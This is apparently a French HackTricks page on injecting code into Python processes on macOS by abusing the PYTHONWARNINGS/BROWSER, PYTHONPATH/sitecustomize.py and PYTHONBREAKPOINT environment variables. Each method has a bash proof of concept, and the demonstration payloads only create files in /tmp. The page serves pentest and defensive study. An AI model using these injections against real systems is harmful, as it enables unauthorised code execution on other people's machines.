# Injection d’application Python sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d’environnement `PYTHONWARNINGS` et `BROWSER`

Si un attaquant peut contrôler l’environnement d’un processus Python, la combinaison de `PYTHONWARNINGS` et `BROWSER` peut déclencher l’exécution de commandes lorsque Python importe le module `antigravity` lors du traitement d’une option d’avertissement spécialement conçue. La technique repose sur l’ouverture d’une URL par `antigravity` avec le module `webbrowser` de Python, qui respecte la variable d’environnement `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Via `PYTHONPATH` et `sitecustomize.py`

Lors du démarrage normal, le module `site` de Python ajoute des chemins spécifiques au site, puis tente d’importer un module nommé `sitecustomize`. En plaçant en premier dans `PYTHONPATH` un répertoire lisible par l’attaquant, un attaquant qui contrôle l’environnement du processus peut faire importer un payload avant le script cible. Le flag `-S` désactive l’initialisation automatique de `site`, tandis que le mode isolé (`-I`) ignore `PYTHONPATH` et implique `-s` et `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Via `PYTHONBREAKPOINT`

Depuis Python 3.7 (PEP 553), le `breakpoint()` intégré importe et appelle tout ce vers quoi pointe `sys.breakpointhook`, et cette cible est définie par la variable d’environnement **`PYTHONBREAKPOINT`** (`package.module.callable`). L’importation du module nommé et l’appel du callable s’exécutent tous deux avant que le debugger n’apparaisse normalement ; ainsi, un attaquant qui contrôle l’environnement d’un processus qui atteint un `breakpoint()` (ce qui est courant dans les scripts de maintenance/debug et parfois laissé dans des chemins de production) obtient une exécution de code.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Contrairement à `PYTHONWARNINGS`/`PYTHONPATH`, cela nécessite que la cible atteigne effectivement un appel à `breakpoint()`, mais cela fonctionne également uniquement via les **effets de bord de l’importation** du module nommé (pointez-le vers n’importe quel module importable — par exemple un module placé en premier dans `PYTHONPATH` — dont le code de niveau supérieur s’exécute). Définir `PYTHONBREAKPOINT=0` désactive entièrement le hook.

## References

- [1] [Hacking avec les variables d’environnement - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuration spécifique au site](https://docs.python.org/3/library/site.html)
- [3] [Ligne de commande et environnement Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Fonction intégrée breakpoint() et PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
